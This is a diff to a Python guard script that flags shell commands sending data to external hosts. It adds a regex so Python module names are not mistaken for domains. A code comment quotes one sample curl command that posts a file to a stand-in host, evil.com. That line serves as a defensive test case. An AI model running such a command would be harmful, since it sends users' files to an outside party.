@@ -208,6 +208,13 @@ NON_DATI_FLAG_VAL = re.compile(
     r'[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
 )
 BARE_HOST = re.compile(r'(?<![\w@/.:=-])([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?::\d+)?(?:/[^\s"\']*)?(?![\w.(])')
+# Nomi di moduli python: `import json, urllib.request`, `from urllib.request import x`, `python3 -m json.tool`.
+# Hanno la forma di un dominio senza schema, e in un POST verso un host interno chiedevano conferma
+# (21/10/2026, #3720). Si tolgono prima di cercare i domini.
+# import e from contano solo a inizio riga (non dopo una riga che finisce con \), -m solo dopo python:
+# `curl -d @x http://localhost import evil.com` manda anche a evil.com, e chiede.
+MODULI_PY = re.compile(r'(?:(?:\A|(?<!\\)\n|;)[ \t]*(?:import|from)|\bpython3?(?:\.\d+)?[ \t]+-m)[ \t]+'
+                       r'[A-Za-z_][\w.]*(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*)*')
 FILE_EXT = frozenset("txt json md csv log pdf png jpg jpeg gif html htm xml yaml yml toml ini cfg conf "
                      "py js ts sh zip gz tgz tar bz2 xz db sqlite sql pem crt der p12 env bak out tmp".split())
 
@@ -328,7 +335,7 @@ def main() -> int:
                     ext = True
                     break
         if not ext and internal_seen:
-            senza_url = OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest))
+            senza_url = MODULI_PY.sub(" ", OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest)))
             for m in BARE_HOST.finditer(senza_url):
                 host = m.group(1)
                 if host.rsplit(".", 1)[-1].lower() in FILE_EXT or _fidato(host):
